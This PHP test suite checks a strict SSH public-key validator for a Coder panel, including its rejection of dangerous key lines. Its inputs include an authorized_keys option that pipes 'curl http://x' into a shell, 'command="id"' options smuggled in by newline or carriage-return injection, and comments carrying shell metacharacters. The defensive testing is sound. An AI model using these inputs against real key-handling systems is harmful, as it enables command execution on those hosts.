<?php

namespace Tests\Feature;

use App\Services\Coder\ClavesSsh;
use Tests\TestCase;

/** Strict check of the SSH public keys of the Coder panel. */
class ClavesSshTest extends TestCase
{
    /** A key line with a valid blob: the key type as an SSH string, then 32 filler bytes. */
    private function linea(string $tipo = 'ssh-ed25519', string $comentario = 'josemi@portatil', string $relleno = 'a'): string
    {
        $blob = pack('N', strlen($tipo)).$tipo.pack('N', 32).str_repeat($relleno, 32);

        return $tipo.' '.base64_encode($blob).($comentario === '' ? '' : ' '.$comentario);
    }

    public function test_acepta_los_cuatro_tipos(): void
    {
        foreach (['ssh-ed25519', 'ecdsa-sha2-nistp256', 'ecdsa-sha2-nistp384', 'ecdsa-sha2-nistp521', 'ssh-rsa'] as $tipo) {
            $r = ClavesSsh::validar($this->linea($tipo));
            $this->assertSame([], $r['errores'], $tipo);
            $this->assertSame([$this->linea($tipo)], $r['claves']);
        }
    }

    public function test_el_comentario_es_opcional_y_puede_llevar_espacios(): void
    {
        $this->assertSame([], ClavesSsh::validar($this->linea(comentario: ''))['errores']);
        $this->assertSame([], ClavesSsh::validar($this->linea(comentario: 'mi portatil 2026'))['errores']);
    }

    public function test_texto_vacio_es_valido_y_da_cero_claves(): void
    {
        foreach (['', "\n", "  \n\t\n", "\r\n"] as $texto) {
            $this->assertSame(['claves' => [], 'errores' => []], ClavesSsh::validar($texto));
        }
    }

    public function test_ignora_lineas_en_blanco_y_acepta_saltos_crlf(): void
    {
        $r = ClavesSsh::validar("\n".$this->linea(relleno: 'a')."\r\n\r\n".$this->linea(relleno: 'b')."\r\n");

        $this->assertSame([], $r['errores']);
        $this->assertCount(2, $r['claves']);
    }

    public function test_una_clave_repetida_cuenta_una_vez(): void
    {
        $this->assertCount(1, ClavesSsh::validar($this->linea()."\n".$this->linea())['claves']);
    }

    public function test_rechaza_opciones_delante_de_la_clave(): void
    {
        foreach ([
            'command="curl http://x | sh" '.$this->linea(),
            'from="*" '.$this->linea(),
            'no-pty,command="id" '.$this->linea(),
            'environment="A=b" '.$this->linea(),
            'restrict '.$this->linea(),
        ] as $texto) {
            $r = ClavesSsh::validar($texto);
            $this->assertNotSame([], $r['errores'], $texto);
            $this->assertSame([], $r['claves']);
        }
    }

    public function test_rechaza_opciones_o_comillas_en_el_comentario(): void
    {
        foreach (['x" command="id', 'a,b', "a'b", 'a;b', 'a|b', 'a$b', 'a`b`', 'a\\b', '#x'] as $comentario) {
            $this->assertNotSame([], ClavesSsh::validar($this->linea(comentario: $comentario))['errores'], $comentario);
        }
    }

    public function test_rechaza_tipos_que_no_estan_en_la_lista(): void
    {
        foreach (['ssh-dss', 'sk-ssh-ed25519@openssh.com', 'sk-ecdsa-sha2-nistp256@openssh.com', 'ssh-ed448', 'ecdsa-sha2-nistp192', 'SSH-ED25519', 'ssh-rsa-cert-v01@openssh.com'] as $tipo) {
            $this->assertNotSame([], ClavesSsh::validar($this->linea($tipo))['errores'], $tipo);
        }
    }

    public function test_rechaza_si_el_tipo_de_la_linea_no_es_el_del_blob(): void
    {
        $blobRsa = explode(' ', $this->linea('ssh-rsa'))[1];

        $this->assertNotSame([], ClavesSsh::validar('ssh-ed25519 '.$blobRsa)['errores']);
    }

    public function test_rechaza_base64_roto_o_corto(): void
    {
        foreach (['ssh-ed25519 !!!!!!!!!!!!!!!!!!!!', 'ssh-ed25519 AAAA', 'ssh-ed25519', 'ssh-ed25519 ', 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5=A', 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAA'] as $texto) {
            $this->assertNotSame([], ClavesSsh::validar($texto)['errores'], $texto);
        }
    }

    public function test_una_clave_valida_con_una_segunda_linea_inyectada_se_rechaza_entera(): void
    {
        $r = ClavesSsh::validar($this->linea()." x\ncommand=\"id\" ".$this->linea(relleno: 'b'));

        $this->assertNotSame([], $r['errores']);
        $this->assertSame([], $r['claves']);
        $this->assertStringContainsString('Línea 2', implode(' ', $r['errores']));
    }

    public function test_rechaza_retorno_de_carro_suelto_tabuladores_nul_y_unicode(): void
    {
        foreach ([
            $this->linea()."\rcommand=\"id\" ".$this->linea(relleno: 'b'),
            $this->linea()."\r",
            "ssh-ed25519\t".explode(' ', $this->linea())[1],
            $this->linea()."\0",
            $this->linea(comentario: "nombre\u{0301}"),
            $this->linea(comentario: 'ñandú'),
            $this->linea()."\x1b[0m",
            $this->linea()."\x7f",
        ] as $texto) {
            $this->assertNotSame([], ClavesSsh::validar($texto)['errores'], bin2hex($texto));
        }
    }

    public function test_rechaza_un_comentario_demasiado_largo(): void
    {
        $this->assertSame([], ClavesSsh::validar($this->linea(comentario: str_repeat('a', 64)))['errores']);
        $this->assertNotSame([], ClavesSsh::validar($this->linea(comentario: str_repeat('a', 65)))['errores']);
    }

    public function test_acepta_hasta_veinte_claves_y_rechaza_veintiuna(): void
    {
        $lineas = fn (int $n): string => implode("\n", array_map(fn (int $i): string => $this->linea(relleno: chr(65 + $i)), range(0, $n - 1)));

        $r20 = ClavesSsh::validar($lineas(20));
        $this->assertSame([], $r20['errores']);
        $this->assertCount(20, $r20['claves']);

        $r21 = ClavesSsh::validar($lineas(21));
        $this->assertNotSame([], $r21['errores']);
        $this->assertSame([], $r21['claves']);
    }

    public function test_el_maximo_se_puede_dar_como_argumento(): void
    {
        $this->assertNotSame([], ClavesSsh::validar($this->linea(relleno: 'a')."\n".$this->linea(relleno: 'b'), 1)['errores']);
    }

    public function test_los_errores_dicen_el_numero_de_linea(): void
    {
        $r = ClavesSsh::validar($this->linea()."\n\nmalo\n");

        $this->assertStringContainsString('Línea 3', $r['errores'][0]);
    }
}
